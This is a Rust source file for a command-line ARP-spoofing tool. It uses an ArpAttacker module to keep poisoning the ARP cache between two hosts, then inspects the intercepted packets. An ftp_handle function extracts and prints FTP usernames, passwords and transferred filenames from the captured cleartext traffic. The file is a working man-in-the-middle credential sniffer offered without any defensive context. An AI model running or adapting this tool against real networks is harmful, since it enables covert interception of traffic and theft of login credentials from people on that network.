mod arp;

use anyhow::{anyhow, Result};
use clap::Parser;
use pnet::{
    datalink::interfaces,
    packet::{
        ethernet::{EtherTypes, EthernetPacket},
        Packet,
    },
    util::MacAddr,
};
use std::{
    io,
    net::Ipv4Addr,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
};

use crate::arp::ArpAttacker;

#[derive(Parser, Debug, Copy, Clone)]
pub struct Args {
    #[clap(value_name = "source ipv4")]
    pub sip: Ipv4Addr,
    #[clap(value_name = "source mac")]
    pub smac: MacAddr,
    #[clap(value_name = "target ipv4")]
    pub tip: Ipv4Addr,
    #[clap(value_name = "target mac")]
    pub tmac: MacAddr,
    #[clap(short, long, help = "prints more information, like full packet data")]
    pub verbose: bool,
}

fn main() -> Result<()> {
    let args = Args::parse();
    let ctrlc = Arc::new(AtomicBool::new(false));
    signal_hook::flag::register(signal_hook::consts::SIGINT, Arc::clone(&ctrlc))?;
    let interfaces = interfaces();
    let iface = interfaces
        .iter()
        .find(|iface| iface.is_up() && !iface.is_loopback())
        .ok_or(anyhow!("failed to find network interface"))?;
    println!("using interface: {}", iface.name);
    let mut client = ArpAttacker::new(iface)?;
    print!(
        "spoofing as {} ({}) to {} ({})...",
        args.tip, args.tmac, args.sip, args.smac
    );
    client.spoof((args.sip, args.smac), (args.tip, args.tmac))?;
    println!(" done.");
    while !ctrlc.load(Ordering::Relaxed) {
        // keep spoofing the arp table
        client.spoof((args.sip, args.smac), (args.tip, args.tmac))?;
        let data = match client.recv() {
            Ok(data) => data,
            Err(e) => {
                // ignore interrupted errors (ctrl-c)
                if let Some(e) = e.downcast_ref::<std::io::Error>() {
                    if e.kind() == io::ErrorKind::Interrupted || e.kind() == io::ErrorKind::TimedOut
                    {
                        continue;
                    }
                };
                println!("failed to receive packet: {}", e);
                continue;
            }
        };
        if args.verbose {
            println!(
                "{:?}.\npayload: {:?}",
                data,
                String::from_utf8_lossy(data.payload())
            );
        }
        _ = ftp_handle(data);
    }
    print!("unspoofing...");
    client.unspoof((args.sip, args.smac), (args.tip, args.tmac))?;
    println!(" done.");
    Ok(())
}

pub fn ftp_handle(p: EthernetPacket) -> Result<()> {
    if p.get_ethertype() != EtherTypes::Ipv4 {
        return Err(anyhow!("packet is not ipv4"));
    }
    let payload = p.payload();
    let viewable_payload = payload
        .iter()
        .filter_map(|&b| {
            let c = b as char;
            if c.is_ascii_graphic() || c == ' ' || c == ';' {
                return Some(c);
            }
            None
        })
        .collect::<String>();
    if let Some(i) = viewable_payload.find("STOR") {
        let filename = &viewable_payload[i + 5..];
        println!("sending {filename}");
    } else if let Some(i) = viewable_payload.find("RETR") {
        let filename = &viewable_payload[i + 5..];
        println!("requesting {filename}");
    } else if let Some(i) = viewable_payload.find("USER") {
        let user = &viewable_payload[i + 5..];
        println!("logging in as {user:?}");
    } else if let Some(i) = viewable_payload.find("PASS") {
        let pass = &viewable_payload[i + 5..];
        println!("logging in with password {pass:?}");
    } else {
        return Err(anyhow!("unrecognized ftp command"));
    }
    Ok(())
}
